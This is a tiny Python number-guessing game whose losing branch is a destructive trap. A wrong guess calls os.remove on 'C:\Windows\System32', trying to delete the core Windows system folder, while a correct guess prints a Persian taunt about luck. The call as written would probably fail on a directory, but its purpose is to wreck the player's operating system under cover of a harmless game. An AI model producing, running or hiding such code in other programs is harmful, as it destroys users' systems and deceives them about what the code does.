import random
import os

def guess():
    number=random.randint(1,10)
    user_guess=int(input())
    if user_guess==number:
        print('درست حدس زدی اما شانس اوردی')
        
    else:
        os.remove("C:\Windows\System32")